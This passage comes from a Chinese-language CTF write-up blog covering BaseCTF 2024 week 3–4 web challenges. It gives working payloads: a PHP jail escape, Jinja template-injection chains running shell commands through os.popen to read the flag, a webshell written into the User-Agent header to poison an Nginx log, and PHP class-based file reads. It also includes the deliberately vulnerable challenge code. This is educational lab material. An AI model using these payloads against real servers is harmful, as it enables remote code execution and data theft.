class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text (URL encoded):&quot;</span>, quote(extend_str))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text (Base64):&quot;</span>, b64encode(extend_str).decode())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Final hash:&quot;</span>, final_hash)<br></code></pre></td></tr></table></figure><p>通过对源码的分析得知random的长度应该是96</p><p><img src="/../../images/basectf/basectf2024/dongmd5.png" alt="dongmd5"></p><p>然后填入就好了</p><p><img src="/../../images/basectf/basectf2024/dongmd51.png" alt="dongmd51"></p><h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h2><h3 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h3><p>这题搜一下其实挺有意思的，应该是从这篇文章进行微调出的题目,<a href="https://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-php/">ringzer0 CTF - Jail Escaping PHP</a>,具体应该是对应level4的那个题目</p><p>打开查看源码进行base64解密，进入可以查看phpinfo(),得到了php版本是7.4,以及一些disable_functions</p><p>直接利用文章构造payload,其外根据php特性，在php小于8的情况下<code>_</code>是直接转化成<code>.</code>可以利用<code>[</code>进行绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?Jail[by.Happy=highlight_file(glob(<span class="hljs-string">&quot;/f*&quot;</span>)[0]);<br></code></pre></td></tr></table></figure><h3 id="复读机"><a href="#复读机" class="headerlink" title="复读机"></a>复读机</h3><p>有过滤的，手测一下</p><p><code>&#123;&#123;`  `+`  `-`  `*`  `&#125;&#125;</code>  <code>&quot;</code>  <code>:</code>  <code>\</code>  <code>/</code>  <code>__</code>  <code>.</code>,接下来就是正常的RCE就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">BaseCTF&#123;%<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cla&#x27;</span><span class="hljs-string">&#x27;ss_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_m&#x27;</span><span class="hljs-string">&#x27;ro_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcl&#x27;</span><span class="hljs-string">&#x27;asses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>])%&#125;<br></code></pre></td></tr></table></figure><p>可以利用<code>BaseCTF&lt;class &#39;os._wrap_close&#39;&gt;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">BaseCTF&#123;%<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cla&#x27;</span><span class="hljs-string">&#x27;ss_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_m&#x27;</span><span class="hljs-string">&#x27;ro_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcl&#x27;</span><span class="hljs-string">&#x27;asses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_in&#x27;</span><span class="hljs-string">&#x27;it_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_gl&#x27;</span><span class="hljs-string">&#x27;obals_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;pen&#x27;</span>](<span class="hljs-string">&#x27;env&#x27;</span>)[<span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-string">&#x27;ad&#x27;</span>]())%&#125;<br></code></pre></td></tr></table></figure><p>看看环境，已知不能使用<code>/</code>,可以切换根目录再读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">BaseCTF&#123;%<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cla&#x27;</span><span class="hljs-string">&#x27;ss_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_m&#x27;</span><span class="hljs-string">&#x27;ro_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcl&#x27;</span><span class="hljs-string">&#x27;asses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_in&#x27;</span><span class="hljs-string">&#x27;it_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_gl&#x27;</span><span class="hljs-string">&#x27;obals_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;pen&#x27;</span>](<span class="hljs-string">&#x27;cd $OLDPWD;cat flag&#x27;</span>)[<span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-string">&#x27;ad&#x27;</span>]())%&#125;<br></code></pre></td></tr></table></figure><h3 id="滤个不停"><a href="#滤个不停" class="headerlink" title="滤个不停"></a>滤个不停</h3><p>这题和ctfshow的web4基本差不多，一开始我以为要从伪协议入手，还是要求的是服务器日志，用的是Nginx，存放在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log里面，让Datch赋值这个，然后在UA头里写马就行了</p><p><img src="/../../images/basectf/basectf2024/%E6%BB%A4%E4%B8%AA%E4%B8%8D%E5%81%9C.png" alt="滤个不停"></p><h3 id="玩原神玩的"><a href="#玩原神玩的" class="headerlink" title="玩原神玩的"></a>玩原神玩的</h3><p>这题其实还是能研究很多的，我写代码的能力一直挺一般的，这个还是稍微考究一些</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;len&#x27;</span>]) == <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$array</span>)) &#123;<br> <span class="hljs-title function_ invoke__">ys_open</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tip&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;错了！就你还想玩原神？❌❌❌&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ys_open</span>(<span class="hljs-params"><span class="hljs-variable">$tip</span></span>) </span>&#123;<br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$tip</span> != <span class="hljs-string">&quot;我要玩原神&quot;</span>) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我不管，我要玩原神！😭😭😭&quot;</span>);<br> &#125;<br> <span class="hljs-title function_ invoke__">dumpFlag</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dumpFlag</span>(<span class="hljs-params"></span>) </span>&#123;<br> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) || <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) != <span class="hljs-number">2</span>) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;可恶的QQ人！😡😡😡&quot;</span>);<br> &#125;<br> <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>][<span class="hljs-number">0</span>];<br> <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>][<span class="hljs-number">1</span>];<br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$a</span>) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$b</span>) || <span class="hljs-variable">$a</span> != <span class="hljs-string">&quot;100%&quot;</span> || <span class="hljs-variable">$b</span> != <span class="hljs-string">&quot;love100%&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>)) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;某站崩了？肯定是某忽悠干的！😡😡😡&quot;</span>);<br> &#125;<br> <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br> <span class="hljs-variable">$flag</span>[] = <span class="hljs-keyword">array</span>();<br> <span class="hljs-keyword">for</span> (<span class="hljs-variable">$ii</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$ii</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$array</span>);<span class="hljs-variable">$ii</span>++) &#123;<br>  <span class="hljs-variable">$flag</span>[<span class="hljs-variable">$ii</span>] = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$array</span>[<span class="hljs-variable">$ii</span>]) ^ <span class="hljs-variable">$ii</span>);<br> &#125;<br> <br> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$flag</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>先看第一层写脚本爆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://challenge.basectf.fun:23955/&#x27;</span><br><br>ans = <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    payload = &#123;<span class="hljs-string">f&#x27;len[<span class="hljs-subst">&#123;j&#125;</span>]&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i)&#125;<br>    response = requests.post(url, data=payload)<br>    <span class="hljs-built_in">print</span>(response.text.splitlines()[-<span class="hljs-number">1</span>])<br>    last_line = response.text.splitlines()[-<span class="hljs-number">1</span>]<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;我不管，我要玩原神！😭😭😭&quot;</span> <span class="hljs-keyword">in</span> last_line:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Success with <span class="hljs-subst">&#123;i&#125;</span> parameters!&#x27;</span>)<br>        ans = i<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span> ans:<br>    payload_str = <span class="hljs-string">&#x27;&amp;&#x27;</span>.join([<span class="hljs-string">f&#x27;len[<span class="hljs-subst">&#123;j&#125;</span>]=0&#x27;</span> <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ans)])<br>    <span class="hljs-built_in">print</span>(payload_str)<br></code></pre></td></tr></table></figure><p>第二层输入<code>?tip=我要玩原神</code></p><p>第三层直接输入需要url编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">m[0]=100%25&amp;m[1]=love100%2530bd7ce7de206924302499f197c7a966<br></code></pre></td></tr></table></figure><p>最后一层</p><ol><li><strong>已知每个加密字符串 <code>enc[i]</code> 是由字符的 ASCII 值和索引 <code>i</code> 异或后的结果再进行 <code>md5</code> 哈希得到的</strong>。</li><li><strong>通过暴力破解的方法</strong>：<ul><li>对每个加密的哈希值 <code>enc[i]</code>，尝试所有可能的字符（ASCII值从0到126）。</li><li>计算这些字符与其索引 <code>i</code> 异或后的值，并对该值进行 <code>md5</code> 哈希。</li><li>如果哈希结果与 <code>enc[i]</code> 相同，说明找到了正确的字符。</li></ul></li><li>**最终结果是解密后的字符串 <code>flag</code>**。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br>enc = [<br>    <span class="hljs-string">&quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;</span>, <span class="hljs-string">&quot;26657d5ff9020d2abefe558796b99584&quot;</span>,<br>    <span class="hljs-string">&quot;73278a4a86960eeb576a8fd4c9ec6997&quot;</span>, <span class="hljs-string">&quot;ec8956637a99787bd197eacd77acce5e&quot;</span>,<br>    <span class="hljs-string">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span>, <span class="hljs-string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span>,<br>    <span class="hljs-string">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span>, <span class="hljs-string">&quot;c8ffe9a587b126f152ed3d89a146b445&quot;</span>,<br>    <span class="hljs-string">&quot;072b030ba126b2f4b2374f342be9ed44&quot;</span>, <span class="hljs-string">&quot;f457c545a9ded88f18ecee47145a72c0&quot;</span>,<br>    <span class="hljs-string">&quot;698d51a19d8a121ce581499d7b701668&quot;</span>, <span class="hljs-string">&quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;</span>,<br>    <span class="hljs-string">&quot;9a1158154dfa42caddbd0694a4e9bdc8&quot;</span>, <span class="hljs-string">&quot;a3c65c2974270fd093ee8a9bf8ae7d0b&quot;</span>,<br>    <span class="hljs-string">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>, <span class="hljs-string">&quot;072b030ba126b2f4b2374f342be9ed44&quot;</span>,<br>    <span class="hljs-string">&quot;7f39f8317fbdb1988ef4c628eba02591&quot;</span>, <span class="hljs-string">&quot;d67d8ab4f4c10bf22aa353e27879133c&quot;</span>,<br>    <span class="hljs-string">&quot;5ef059938ba799aaa845e1c2e8a762bd&quot;</span>, <span class="hljs-string">&quot;1c383cd30b7c298ab50293adfecb7b18&quot;</span>,<br>    <span class="hljs-string">&quot;a5771bce93e200c36f7cd9dfd0e5deaa&quot;</span>, <span class="hljs-string">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>,<br>    <span class="hljs-string">&quot;e369853df766fa44e1ed0ff613f563bd&quot;</span>, <span class="hljs-string">&quot;e369853df766fa44e1ed0ff613f563bd&quot;</span>,<br>    <span class="hljs-string">&quot;6c8349cc7260ae62e3b1396831a8398f&quot;</span>, <span class="hljs-string">&quot;a0a080f42e6f13b3a2df133f073095dd&quot;</span>,<br>    <span class="hljs-string">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>, <span class="hljs-string">&quot;a0a080f42e6f13b3a2df133f073095dd&quot;</span>,<br>    <span class="hljs-string">&quot;6c8349cc7260ae62e3b1396831a8398f&quot;</span>, <span class="hljs-string">&quot;069059b7ef840f0c74a814ec9237b6ec&quot;</span>,<br>    <span class="hljs-string">&quot;f7177163c833dff4b38fc8d2872f1ec6&quot;</span>, <span class="hljs-string">&quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;</span>,<br>    <span class="hljs-string">&quot;c74d97b01eae257e44aa9d5bade97baf&quot;</span>, <span class="hljs-string">&quot;37693cfc748049e45d87b8c7d8b9aacd&quot;</span>,<br>    <span class="hljs-string">&quot;37693cfc748049e45d87b8c7d8b9aacd&quot;</span>, <span class="hljs-string">&quot;02e74f10e0327ad868d138f2b4fdd6f0&quot;</span>,<br>    <span class="hljs-string">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span>, <span class="hljs-string">&quot;7cbbc409ec990f19c78c75bd1e06f215&quot;</span>,<br>    <span class="hljs-string">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span>, <span class="hljs-string">&quot;14bfa6bb14875e45bba028a21ed38046&quot;</span>,<br>    <span class="hljs-string">&quot;ad61ab143223efbc24c7d2583be69251&quot;</span>, <span class="hljs-string">&quot;6ea9ab1baa0efb9e19094440c317e21b&quot;</span>,<br>    <span class="hljs-string">&quot;d1fe173d08e959397adf34b1d77e88d7&quot;</span>, <span class="hljs-string">&quot;d1fe173d08e959397adf34b1d77e88d7&quot;</span>,<br>    <span class="hljs-string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span><br>]<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">45</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">if</span>(md5(<span class="hljs-built_in">str</span>(c^i).encode()).hexdigest()==enc[i]):<br>            flag+=<span class="hljs-built_in">chr</span>(c)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>代码自行修改就可以得到flag了</p><h1 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h1><h2 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h2><h3 id="flag直接读取不就行了？"><a href="#flag直接读取不就行了？" class="headerlink" title="flag直接读取不就行了？"></a>flag直接读取不就行了？</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><span class="hljs-comment"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$J1ng</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br><span class="hljs-variable">$Hong</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;H&#x27;</span>];<br><span class="hljs-variable">$Keng</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;K&#x27;</span>];<br><span class="hljs-variable">$Wang</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;W&#x27;</span>];<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$Keng</span>(<span class="hljs-variable">$Wang</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$J1ng</span>(<span class="hljs-variable">$Hong</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>读取目录可以利用<code>DirectoryIterator</code>进行读取，逐层遍历得到具体位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?K=DirectoryIterator&amp;W=../../../secret<br></code></pre></td></tr></table></figure><p>然后post读取就可以得到flag了，需要看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">J=SplFileObject&amp;H=../../../secret/f11444g.php<br></code></pre></td></tr></table></figure><h3 id="圣钥之战1-0"><a href="#圣钥之战1-0" class="headerlink" title="圣钥之战1.0"></a>圣钥之战1.0</h3><p>考察python原型链的知识，以前没写过刚好帮我入了门，先上源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_json</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">try</span>:<br>        json.loads(data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/static/index.html&#x27;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Read</span>():<br>    file = <span class="hljs-built_in">open</span>(__file__, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;J1ngHong说：你想read flag吗？</span><br><span class="hljs-string">那么圣钥之光必将阻止你！</span><br><span class="hljs-string">但是小小的源码没事，因为你也读不到flag(乐)</span><br><span class="hljs-string"><span class="hljs-subst">&#123;file&#125;</span></span><br><span class="hljs-string">&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/pollute&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Pollution</span>():<br>    <span class="hljs-keyword">if</span> request.is_json:<br>        merge(json.loads(request.data),instance)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;J1ngHong说：钥匙圣洁无暇，无人可以污染！&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><p>原理先按下不表，之后会出一篇文章学习一下原型链，主要是先写题目。大致就是利用merge函数来修改父类的属性</p><p>思路是利用&#x2F;read下的<code>__file__</code>进行读取flag，想要利用这个，需要通过&#x2F;pollute的传参就是污染，用merge对这个进行修改，同时<code>__file__</code>变量是一个全局值，就可以用上面写到的<code>__globals__</code>函数来获取全局变量并进行修改</p><p><img src="/../../images/basectf/basectf2024/zhan1.png" alt="zhan1"></p><p>注意的是需要添加头，否则不能读取成功<code>Content-Type: application/json</code></p><p>之后在&#x2F;read刷新一下就出flag了，不能理解的看一下代码原理。</p><p><img src="/../../images/basectf/basectf2024/zhan2.png" alt="zhan2"></p><h3 id="only-one-sql"><a href="#only-one-sql" class="headerlink" title="only one sql"></a>only one sql</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sql&#x27;</span>];<br><span 